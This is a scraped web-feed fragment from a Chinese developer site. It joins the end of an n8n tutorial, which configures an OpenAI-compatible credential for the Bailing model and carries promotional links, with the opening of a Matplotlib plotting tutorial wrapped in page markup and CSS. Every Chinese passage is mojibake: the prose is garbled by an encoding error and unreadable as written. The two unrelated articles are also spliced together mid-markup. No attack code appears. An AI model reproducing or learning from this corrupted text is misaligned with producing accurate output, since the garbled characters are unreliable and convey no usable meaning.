<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76d197ccb7564c6585e232c2787a73c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=Ka4FkFl4lzlrNaU6sBUxDtyeUVY%3D" alt="20.png" loading="lazy"/></p>
<p>åœ¨ n8n è¿™è¾¹ç»™ç™¾çµåˆ›å»ºä¸€ä¸ª OpenAI çš„å‡­è¯ã€‚</p>
<p><code>API Key</code> å¡«ä½ åˆšåˆšåˆ›å»ºçš„ã€‚</p>
<p><code>Base URL</code> å¡«è¿™ä¸ª <code>https://api.tbox.cn/api/llm/v1/</code>ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51760f1dd65f4c159db0d44c2b293805~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=%2B%2BTCwAi3yHJDNvqCd8MDAb5lsgk%3D" alt="21.png" loading="lazy"/></p>
<p>æ¥åˆ°å·¥ä½œæµè¿™è¾¹ä½ ä¼šå‘ç°æ²¡æ¨¡å‹å¯ä»¥é€‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dbce9b2504fe407c8c8b57ea68704a18~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=hvJYJHRPBolgZhOMpMLN7zCSI%2FA%3D" alt="22.png" loading="lazy"/></p>
<p>ä½ éœ€è¦æ‰“å¼€ç™¾çµçš„ä½¿ç”¨æ‰‹å†Œï¼Œé€‰æ‹©ä¸€ä¸ªæ¨¡å‹ï¼Œå¡«å…¥å¯¹åº”çš„â€œç‰ˆæœ¬åç§°â€ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Falipaytbox.yuque.com%2Fsxs0ba%2Fling%2Fmodel_overview" target="_blank" title="https://alipaytbox.yuque.com/sxs0ba/ling/model_overview" ref="nofollow noopener noreferrer">alipaytbox.yuque.com/sxs0ba/lingâ€¦</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/315f83382ea54807b707c5a2ba19c27c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=uZYd7kJEI7L2tYMRz1cRpiD3590%3D" alt="23.png" loading="lazy"/></p>
<p><code>Model</code> è¿™é¡¹è¦é€‰ <code>By ID</code>ï¼Œå€¼å°±å¡«å…¥æ¨¡å‹çš„â€œç‰ˆæœ¬åç§°â€ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc39b6c71de9493892fc67949549ff53~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=bISIus2v0U1e7Zq29Tbq1uRMmQA%3D" alt="24.png" loading="lazy"/></p>
<p>èƒ½å«–ï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6975d76e57ac48619b56654f077a10db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770768876&amp;x-signature=rV%2FLs%2BYqznD6gc5nRNkXnF%2BGziQ%3D" alt="25.png" loading="lazy"/></p>
<p>å€ŸåŠ©å·¥å…·å¯å¿«é€Ÿå®ç°è‡ªåŠ¨åŒ–æµç¨‹ï¼Œè½åœ°æ—¶éœ€å…³æ³¨å¤šåœºæ™¯é€‚é…çš„å·¥ç¨‹æ•ˆç‡é—®é¢˜ã€‚å¯è¯•è¯•<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.rollcode.cn%2F%3Fsource%3Dba%26id%3Dzhuren" target="_blank" title="https://www.rollcode.cn/?source=ba&amp;id=zhuren" ref="nofollow noopener noreferrer">RollCode ä½ä»£ç å¹³å°</a>çš„ç§æœ‰åŒ–éƒ¨ç½²ã€è‡ªå®šä¹‰ç»„ä»¶ã€é™æ€é¡µé¢å‘å¸ƒï¼ˆSSG + SEOï¼‰èƒ½åŠ›ã€‚</p>
<hr/>
<p>ä»¥ä¸Šå°±æ˜¯æœ¬æ–‡çš„å…¨éƒ¨å†…å®¹å•¦ï¼Œæƒ³äº†è§£æ›´å¤šn8nç©æ³•æ¬¢è¿å…³æ³¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fappmsgalbum%3F__biz%3DMzAwMjU3ODU5Ng%3D%3D%26action%3Dgetalbum%26album_id%3D4337364695070801925%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzAwMjU3ODU5Ng==&amp;action=getalbum&amp;album_id=4337364695070801925#wechat_redirect" ref="nofollow noopener noreferrer">ã€Šn8nä¿®ç‚¼æ‰‹å†Œã€‹</a>ğŸ‘</p>
<p>å¦‚æœä½ æœ‰ NASï¼Œæˆ‘éå¸¸å»ºè®®ä½ åœ¨ NAS ä¸Šéƒ¨ç½²ä¸€å¥— n8nï¼Œææå‰¯ä¸šä¹Ÿå¥½ï¼Œå¸®ä½ å®Œæˆå·¥ä½œä»»åŠ¡ä¹Ÿå¥½ <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FppIWKP8StiFn2k2IW0ZpNQ" target="_blank" title="https://mp.weixin.qq.com/s/ppIWKP8StiFn2k2IW0ZpNQ" ref="nofollow noopener noreferrer">ã€Šã€NASã€ä¸æ­¢å¨±ä¹ï¼ŒNASä¹Ÿæ˜¯ç”Ÿäº§åŠ›ï¼Œåœ¨ç»¿è”éƒ¨ç½²AIå·¥ä½œæµå·¥å…·-n8nã€‹</a></p>
<p><strong>ç‚¹èµ + å…³æ³¨ + æ”¶è— = å­¦ä¼šäº†</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Matplotlib ç»˜å›¾æŒ‡å—ï¼šèšç„¦æ•°æ®å¯è§†åŒ–æ ¸å¿ƒç”¨æ³•]]></title>    <link>https://juejin.cn/post/7602455806446551046</link>    <guid>https://juejin.cn/post/7602455806446551046</guid>    <pubDate>2026-02-04T00:26:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602455806446551046" data-draft-id="7602454700504039465" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Matplotlib ç»˜å›¾æŒ‡å—ï¼šèšç„¦æ•°æ®å¯è§†åŒ–æ ¸å¿ƒç”¨æ³•"/> <meta itemprop="keywords" content="Python,æ•°æ®å¯è§†åŒ–"/> <meta itemprop="datePublished" content="2026-02-04T00:26:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Narrastory"/> <meta itemprop="url" content="https://juejin.cn/user/4355593566170010"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Matplotlib ç»˜å›¾æŒ‡å—ï¼šèšç„¦æ•°æ®å¯è§†åŒ–æ ¸å¿ƒç”¨æ³•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4355593566170010/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Narrastory
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T00:26:56.000Z" title="Wed Feb 04 2026 00:26:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{font-size:24px;display:inline-block;font-weight:700;background:#ef7060;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(239,112,96,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 50px);border-bottom:3px solid #ef7060}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #3e3e3e;margin-top:32px;margin-bottom:32px;height:1px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(27,31,35,.05);color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:JetBranins Mono,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px;background-color:#fdfdfd}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#fdfdfd}.markdown-body a{text-decoration:none;font-weight:700;color:#ef7060;border-bottom:1px solid #ef7060}.markdown-body a:active,.markdown-body a:hover{color:#ef2d26}.markdown-body table tr td,.markdown-body table tr th{border:1px solid #ccc;padding:5px 10px}.markdown-body table{display:block!important;width:auto;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{background:#f0f0f0;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#f8f8f8}.markdown-body blockquote{margin-inline-start:0;margin-inline-end:0;border-left:3px solid #ef7060;background:#fff9f9;padding:1px 20px;margin-top:20px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#a626a4}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#986801}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">Matplotlib å¸¸ç”¨åŠŸèƒ½</h2>
<p><code>2026 | ming</code></p>
<hr/>
<div align="center">
  <img align="center" src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5f641e5475f24798a05368b97faa0b6e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=kejQfqXa4uP5Rsw0MAlapHgCeSk%3D" alt="AI Generated Art" width="90%" loading="lazy"/>
</div>
<h3 data-id="heading-1">ä¸€. ç®€ä»‹</h3>
<p>å­¦æœ¯ç»˜å›¾å·¥å…·åƒåƒä¸‡ï¼Œä½†æˆ‘ç”¨çš„æœ€å¤šçš„ä¾ç„¶æ˜¯Pythonçš„Matplotlibç»˜å›¾åº“ã€‚</p>
<p>è¿™å¹¶éå› ä¸ºå®ƒèƒ½åšå‡ºæœ€ç‚«ä¸½çš„å›¾è¡¨ï¼ˆè™½ç„¶è®¤çœŸè°ƒæ•´åå®Œå…¨å¯ä»¥ï¼‰ï¼Œè€Œæ˜¯å› ä¸ºå®ƒ<strong>è¶³å¤Ÿè½»é‡ã€ä¸Šæ‰‹æå¿«ã€ä¸”é«˜åº¦å¯å®šåˆ¶</strong>â€”â€”å¦‚æœä½ å·²ç»ç†Ÿæ‚‰ Pythonï¼Œé‚£ä¹ˆå‡ ä¹å¯ä»¥ç«‹å³å¼€å§‹ç”»å›¾ã€‚å®ƒçš„æ ¸å¿ƒåº“ä½“ç§¯å¾ˆå°ï¼Œå´æä¾›äº†ä»åŸºç¡€åˆ°é«˜çº§å‡ ä¹æ— é™çš„å¯è°ƒç»†èŠ‚ã€‚å°¤å…¶åœ¨å½“å‰ AI è¾…åŠ©ç¼–ç é€æ¸æ™®åŠçš„èƒŒæ™¯ä¸‹ï¼Œé‚£äº›ç°ä»£åŒ–é«˜ç«¯çš„å›¾è¡¨æ ·å¼å®Œå…¨å¯ä»¥äº¤ç»™AIå»å®Œæˆï¼Œè‡ªå·±åªéœ€æŠŠæ¡å›¾è¡¨çš„æ ¸å¿ƒç»“æ„å³å¯ã€‚</p>
<p>æˆ–è®¸ä½ ä¼šé—®ï¼šä¸ºä»€ä¹ˆä¸ç”¨å¦ä¸€ä¸ªPythonç»˜å›¾åº“ <strong>Seaborn</strong>ï¼Ÿå®ƒé»˜è®¤æ ·å¼ç¾è§‚ï¼Œä»£ç ä¹Ÿæ›´ç®€æ´ã€‚ç¡®å®ï¼ŒSeaborn åœ¨å¿«é€Ÿç»˜åˆ¶ç»Ÿè®¡å›¾è¡¨æ—¶éå¸¸å‡ºè‰²ï¼Œå®ƒä¸ Matplotlib åŒå± Python å¯è§†åŒ–ç”Ÿæ€ä¸­çš„é‡è¦æˆå‘˜ï¼Œé€‰ç”¨å“ªä¸€ä¸ªæ›´å¤šå–å†³äºåœºæ™¯å’Œä¸ªäººä¹ æƒ¯ã€‚</p>
<p>æˆ‘ä¹‹æ‰€ä»¥é€‰æ‹©Matplotlibï¼Œæ˜¯å› ä¸ºè€ƒè™‘åˆ°SeabornåŒæ ·æ˜¯åŸºäºMatplotlibå¼€å‘çš„ï¼Œå®ƒæœ¬è´¨æ˜¯Matplotlibçš„é«˜çº§å°è£…ï¼Œè™½ç„¶æä¾›äº†ä¾¿æ·æ€§ï¼Œä½†è‹¥æ˜¯è¦æ·±åº¦å®šåˆ¶åŒ–éå¸¸è§„å›¾è¡¨ï¼Œè¿˜æ˜¯è¦å›åˆ°Matplotlibåº•å±‚æ¥å£ã€‚å› æ­¤ï¼Œæˆ‘è®¤ä¸ºæŒæ¡ Matplotlib ç›¸å½“äºæŒæ¡äº† Python ç§‘å­¦ç»˜å›¾çš„åŸºç¡€â€œè¯­è¨€â€ï¼Œèƒ½å¤Ÿè®©ä½ åœ¨å¯è§†åŒ–è®¾è®¡ä¸Šæ‹¥æœ‰æ›´å¤§çš„è‡ªç”±åº¦ã€‚</p>
<p>æ³¨æ„ï¼šæœ¬ç³»åˆ—æ•™ç¨‹å‡è®¾ä½ å·²ç»å…·å¤‡<strong>åŸºç¡€çš„ Python è¯­æ³•çŸ¥è¯†</strong>ã€‚å¦å¤–ï¼ŒMatplotlib ä¸ NumPy å’Œ pandas çš„ååŒèƒ½åŠ›æä¸ºå‡ºè‰²ï¼Œåœ¨å®é™…çš„æ•°æ®åˆ†æä¸ç§‘ç ”ç»˜å›¾ä¸­ä¹Ÿå¸¸å¸¸æ­é…ä½¿ç”¨â€”â€”å®ƒä»¬å…±åŒæ„æˆ Python æ•°æ®ç§‘å­¦ç”Ÿæ€ä¸­çš„æ ¸å¿ƒã€‚ä¸è¿‡ä¸ºäº†é™ä½å…¥é—¨é—¨æ§›ï¼Œæœ¬ç³»åˆ—çš„ç¤ºä¾‹å‡ä½¿ç”¨åŸç”Ÿ Python æ•°æ®ç»“æ„ã€‚</p>
<p>ç™¾é—»ä¸å¦‚ä¸€è§ï¼Œä¸€å›¾èƒœåƒè¨€ï¼Œä¸‹é¢å°±æ¥ç®€å•çš„çœ‹ä¸€ä¸‹æˆ‘æ›¾ç»ä½¿ç”¨matplotlibåœ¨çŸ­æ—¶é—´å†…ç»˜åˆ¶å‡ºæ¥çš„å›¾è¡¨ï¼š</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c82f1864a7c94ed08f37c946dc26afc9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=5FJeI6rISkWN9FSuoJpLyLaMwJA%3D" alt="t1.jpg" width="100%" loading="lazy"/></p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54a4b86144ac4d1dba9e46774dcd2e11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=r7PTTzIJ%2BETVdBknF0WatNhULcg%3D" alt="t2.jpg" width="100%" loading="lazy"/></p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4284e009cd7d47b8bbfec6fa3f99ba19~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=GeiDGgyERcfoYPNd9MPEWHXrP60%3D" alt="t3.jpg" width="100%" loading="lazy"/></p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a7926633a1e415190bd3aeda298ad8a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=3i6UG6RIgmDv2N31SjjtzbJ0MeY%3D" alt="t4.jpg" width="100%" loading="lazy"/></p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/adaf9a20c6024e84ab432a816400a4f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=aPX9V7ssLPbIWXSWW3IPuvsJOY4%3D" alt="t5.jpg" width="100%" loading="lazy"/></p>
<p>æœ¬æ•™ç¨‹å°†æŒ‰å›¾è¡¨ç±»å‹è¿›è¡Œåˆ†ç±»è®²è§£ã€‚Matplotlib çš„å‚æ•°é…ç½®é¡¹éå¸¸ä¸°å¯Œï¼Œå…‰çœ‹æ–‡å­—å’Œå›¾ç‰‡æ˜¯è¿œè¿œä¸å¤Ÿçš„â€”â€”<strong>ä¸€å®šè¦åŠ¨æ‰‹å®è·µ</strong>ã€‚è¯·åŠ¡å¿…å¤åˆ¶æ–‡ç« ä¸­çš„ç¤ºä¾‹ä»£ç ï¼Œè‡ªå·±è¿è¡Œä¸€éï¼Œå¹¶å°è¯•è°ƒæ•´å…¶ä¸­çš„å‚æ•°ï¼Œè§‚å¯Ÿå›¾å½¢å¦‚ä½•å˜åŒ–ã€‚åªæœ‰äº²æ‰‹æ“ä½œï¼Œæ‰èƒ½çœŸæ­£ç†è§£æ¯ä¸ªé€‰é¡¹çš„ä½œç”¨ï¼Œè®°å¿†ä¹Ÿä¼šæ›´åŠ æ·±åˆ»ã€‚</p>
